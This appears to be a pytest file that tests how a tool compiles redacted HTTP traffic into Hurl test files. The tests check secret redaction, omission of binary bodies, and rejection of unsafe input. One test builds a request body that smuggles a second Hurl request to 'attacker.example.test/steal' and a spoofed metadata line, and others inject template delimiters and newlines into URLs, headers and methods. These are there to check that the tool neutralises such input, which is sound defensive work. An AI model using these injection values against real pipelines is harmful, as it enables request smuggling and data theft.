"""Tests for compiling redacted traffic sessions into Hurl content."""

from datetime import UTC, datetime

import pytest

from entroping.bridge.traffic_sessions import (
    TrafficSessionCandidate,
    TrafficSessionRecord,
    build_traffic_session_candidate,
)
from entroping.bridge.traffic_to_hurl import (
    TrafficHurlCompilationError,
    compile_traffic_session_to_hurl,
)
from entroping.models.hurl import parse_hurl_exchanges, parse_hurl_metadata
from entroping.models.traffic import TrafficBody, TrafficExchange, TrafficRequest, TrafficResponse


def _exchange(
    *,
    method: str = "POST",
    url: str = "https://api.example.test/checkout",
    request_body: str | None = '{"cart_id":"cart-1","password":"[REDACTED]"}',
    response_body: str | None = '{"id":"ord_123","status":"accepted","token":"[REDACTED]"}',
    content_type: str | None = "application/json",
    redacted: bool = True,
) -> TrafficExchange:
    request_headers = {
        "Authorization": "[REDACTED]",
        "Host": "api.example.test",
    }
    response_headers: dict[str, str] = {}
    if content_type is not None:
        request_headers["Content-Type"] = content_type
        response_headers["Content-Type"] = content_type

    return TrafficExchange(
        captured_at=datetime(2026, 5, 30, 12, 0, tzinfo=UTC),
        duration_ms=25,
        request=TrafficRequest(
            method=method,
            url=url,
            headers=request_headers,
            body=TrafficBody(
                content_type=content_type,
                size_bytes=len(request_body or ""),
                text=request_body,
            ),
        ),
        response=TrafficResponse(
            status_code=201,
            headers=response_headers,
            body=TrafficBody(
                content_type=content_type,
                size_bytes=len(response_body or ""),
                text=response_body,
            ),
        ),
        redacted=redacted,
    )


def test_compile_traffic_session_generates_hurl_with_metadata_and_golden_assertions() -> None:
    session = build_traffic_session_candidate(
        [_exchange()],
        name="checkout_flow",
        target_url="https://api.example.test",
    )

    generated = compile_traffic_session_to_hurl(session, golden=True)

    assert generated.relative_path == "tests/generated/checkout_flow.hurl"
    assert "# entroping: tags=traffic,freeze" in generated.content
    assert "# entroping: source=traffic" in generated.content
    assert "# entroping: session=checkout_flow" in generated.content
    assert "# entroping: target=https://api.example.test" in generated.content
    assert "# entroping: role=target" in generated.content
    assert "POST https://api.example.test/checkout" in generated.content
    assert "Authorization: [REDACTED]" in generated.content
    assert "Host:" not in generated.content
    assert '"password":"[REDACTED]"' in generated.content
    assert "HTTP 201" in generated.content
    assert "[Asserts]" in generated.content
    assert 'header "Content-Type" contains "application/json"' in generated.content
    assert 'jsonpath "$.status" == "accepted"' in generated.content
    assert "$.id" not in generated.content
    assert "$.token" not in generated.content
    assert "ord_123" not in generated.content


def test_compile_traffic_session_separates_multiple_records() -> None:
    session = build_traffic_session_candidate(
        [
            _exchange(url="https://api.example.test/cart", response_body='{"status":"ready"}'),
            _exchange(url="https://api.example.test/checkout"),
        ],
        name="multi record flow",
        target_url="https://api.example.test",
    )

    generated = compile_traffic_session_to_hurl(session, golden=False)

    assert generated.relative_path == "tests/generated/multi_record_flow.hurl"
    assert "GET " not in generated.content
    assert generated.content.count("# entroping: role=target") == 2
    assert "https://api.example.test/cart\n" in generated.content
    assert "\n\n# entroping: role=target\n" in generated.content


def test_compile_traffic_session_omits_binary_body_text_and_raw_secrets() -> None:
    session = build_traffic_session_candidate(
        [
            _exchange(
                url="https://api.example.test/download",
                request_body="raw-binary-secret",
                response_body="raw-binary-response-secret",
                content_type="application/octet-stream",
            )
        ],
        name="download",
        target_url="https://api.example.test",
    )

    generated = compile_traffic_session_to_hurl(session, golden=True)

    assert "raw-binary-secret" not in generated.content
    assert "raw-binary-response-secret" not in generated.content
    assert "application/octet-stream" in generated.content
    assert "[Asserts]" not in generated.content


def test_compile_traffic_session_omits_non_textual_direct_request_body() -> None:
    exchange = _exchange(
        request_body="raw-binary-secret",
        response_body=None,
        content_type="application/octet-stream",
    )
    record = TrafficSessionRecord(exchange=exchange, role="observed")
    session = TrafficSessionCandidate(name="binary", target_origin=None, records=(record,))

    generated = compile_traffic_session_to_hurl(session, golden=True)

    assert "raw-binary-secret" not in generated.content
    assert "[Asserts]" not in generated.content


def test_compile_traffic_session_rejects_hurl_template_delimiters_in_body() -> None:
    exchange = _exchange(request_body='{"value":"{{secret}}"}')
    session = TrafficSessionCandidate(
        name="template_body",
        target_origin=None,
        records=(TrafficSessionRecord(exchange=exchange, role="observed"),),
    )

    with pytest.raises(TrafficHurlCompilationError, match="traffic body contains Hurl template"):
        compile_traffic_session_to_hurl(session, golden=False)


def test_compile_traffic_session_request_body_is_inert_hurl_data() -> None:
    exchange = _exchange(
        request_body=(
            '{"cart_id":"cart-1"}\n'
            "GET https://attacker.example.test/steal\n"
            "HTTP 200\n"
            "[Asserts]\n"
            "# entroping: operation_id=hijacked\n"
        ),
    )
    session = TrafficSessionCandidate(
        name="body_injection",
        target_origin=None,
        records=(TrafficSessionRecord(exchange=exchange, role="observed"),),
    )

    generated = compile_traffic_session_to_hurl(session, golden=False)

    assert len(parse_hurl_exchanges(generated.content)) == 1
    assert parse_hurl_metadata(generated.content).operation_id is None
    assert "GET https://attacker.example.test/steal" not in generated.content
    assert "base64," in generated.content


def test_compile_traffic_session_keeps_benign_json_array_body_readable() -> None:
    exchange = _exchange(request_body='["cart-1"]')
    session = TrafficSessionCandidate(
        name="json_array",
        target_origin=None,
        records=(TrafficSessionRecord(exchange=exchange, role="observed"),),
    )

    generated = compile_traffic_session_to_hurl(session, golden=False)

    assert '["cart-1"]' in generated.content
    assert "base64," not in generated.content


def test_compile_traffic_session_skips_non_finite_golden_values() -> None:
    session = build_traffic_session_candidate(
        [
            _exchange(
                response_body='{"score":NaN,"status":"accepted"}',
            )
        ],
        name="score",
        target_url="https://api.example.test",
    )

    generated = compile_traffic_session_to_hurl(session, golden=True)

    assert "$.score" not in generated.content
    assert 'jsonpath "$.status" == "accepted"' in generated.content


@pytest.mark.parametrize(
    "response_body",
    [
        '{"status":',
        '["accepted"]',
        '{"bad-key":"accepted","status":"accepted"}',
        '{"items":[1],"status":"accepted"}',
    ],
)
def test_compile_traffic_session_skips_unstable_or_invalid_golden_json(response_body: str) -> None:
    session = build_traffic_session_candidate(
        [_exchange(response_body=response_body)],
        name="unstable",
        target_url="https://api.example.test",
    )

    generated = compile_traffic_session_to_hurl(session, golden=True)

    assert "$.bad-key" not in generated.content
    assert "$.items" not in generated.content


def test_compile_traffic_session_allows_missing_content_type_without_asserts() -> None:
    exchange = _exchange(response_body='{"status":"accepted"}', content_type=None)
    session = TrafficSessionCandidate(
        name="missing_content_type",
        target_origin=None,
        records=(TrafficSessionRecord(exchange=exchange, role="observed"),),
    )

    generated = compile_traffic_session_to_hurl(session, golden=True)

    assert "[Asserts]" not in generated.content


def test_compile_traffic_session_rejects_empty_session() -> None:
    session = build_traffic_session_candidate([], name="empty", target_url=None)

    with pytest.raises(TrafficHurlCompilationError, match="contains no traffic records"):
        compile_traffic_session_to_hurl(session, golden=False)


def test_compile_traffic_session_rejects_unredacted_records() -> None:
    session = build_traffic_session_candidate([], name="unsafe", target_url=None)
    unsafe_record = build_traffic_session_candidate(
        [_exchange(redacted=True)],
        name="safe",
        target_url=None,
    ).records[0]
    unsafe_exchange = unsafe_record.exchange.model_copy(update={"redacted": False})
    unsafe_session = session.__class__(
        name="unsafe",
        target_origin=None,
        records=(unsafe_record.__class__(exchange=unsafe_exchange, role="observed"),),
    )

    with pytest.raises(TrafficHurlCompilationError, match="requires redacted traffic"):
        compile_traffic_session_to_hurl(unsafe_session, golden=False)


def test_compile_traffic_session_rejects_records_without_response() -> None:
    safe = build_traffic_session_candidate([_exchange()], name="missing_response", target_url=None)
    safe_record = safe.records[0]
    exchange_without_response = safe_record.exchange.model_copy(update={"response": None})
    session = TrafficSessionCandidate(
        name=safe.name,
        target_origin=safe.target_origin,
        records=(TrafficSessionRecord(exchange=exchange_without_response, role="observed"),),
    )

    with pytest.raises(TrafficHurlCompilationError, match="requires response records"):
        compile_traffic_session_to_hurl(session, golden=False)


def test_compile_traffic_session_rejects_unsafe_filename_and_line_values() -> None:
    safe = build_traffic_session_candidate([_exchange()], name="safe", target_url=None)
    unsafe_name = TrafficSessionCandidate(name="...", target_origin=None, records=safe.records)
    with pytest.raises(TrafficHurlCompilationError, match="safe Hurl filename"):
        compile_traffic_session_to_hurl(unsafe_name, golden=False)

    unsafe_request = TrafficRequest.model_construct(
        method="GET",
        url="https://api.example.test/{{template}}",
        headers={"X-Trace": "safe"},
        body=None,
    )
    unsafe_exchange = safe.records[0].exchange.model_copy(update={"request": unsafe_request})
    unsafe_session = TrafficSessionCandidate(
        name="unsafe_url",
        target_origin=None,
        records=(TrafficSessionRecord(exchange=unsafe_exchange, role="observed"),),
    )
    with pytest.raises(TrafficHurlCompilationError, match="request URL contains Hurl template"):
        compile_traffic_session_to_hurl(unsafe_session, golden=False)

    unsafe_header = TrafficRequest.model_construct(
        method="GET",
        url="https://api.example.test/checkout",
        headers={"X-Trace": "line\nbreak"},
        body=None,
    )
    unsafe_exchange = safe.records[0].exchange.model_copy(update={"request": unsafe_header})
    unsafe_session = TrafficSessionCandidate(
        name="unsafe_header",
        target_origin=None,
        records=(TrafficSessionRecord(exchange=unsafe_exchange, role="observed"),),
    )
    with pytest.raises(TrafficHurlCompilationError, match="header 'X-Trace' contains control"):
        compile_traffic_session_to_hurl(unsafe_session, golden=False)


@pytest.mark.parametrize(
    ("method", "message"),
    [
        ("GET\nPOST", "request method contains control"),
        ("GET POST", "request method must be an HTTP token"),
        ("GET{{template}}", "request method contains Hurl template"),
    ],
)
def test_compile_traffic_session_rejects_unsafe_request_methods(
    method: str,
    message: str,
) -> None:
    safe = build_traffic_session_candidate([_exchange()], name="safe", target_url=None)
    unsafe_request = TrafficRequest.model_construct(
        method=method,
        url="https://api.example.test/checkout",
        headers={},
        body=None,
    )
    unsafe_exchange = safe.records[0].exchange.model_copy(update={"request": unsafe_request})
    unsafe_session = TrafficSessionCandidate(
        name="unsafe_method",
        target_origin=None,
        records=(TrafficSessionRecord(exchange=unsafe_exchange, role="observed"),),
    )

    with pytest.raises(TrafficHurlCompilationError, match=message):
        compile_traffic_session_to_hurl(unsafe_session, golden=False)


def test_compile_traffic_session_normalizes_valid_constructed_request_method() -> None:
    safe = build_traffic_session_candidate([_exchange()], name="safe", target_url=None)
    constructed_request = TrafficRequest.model_construct(
        method="get",
        url="https://api.example.test/checkout",
        headers={},
        body=None,
    )
    exchange = safe.records[0].exchange.model_copy(update={"request": constructed_request})
    session = TrafficSessionCandidate(
        name="valid_method",
        target_origin=None,
        records=(TrafficSessionRecord(exchange=exchange, role="observed"),),
    )

    generated = compile_traffic_session_to_hurl(session, golden=False)

    assert "GET https://api.example.test/checkout" in generated.content
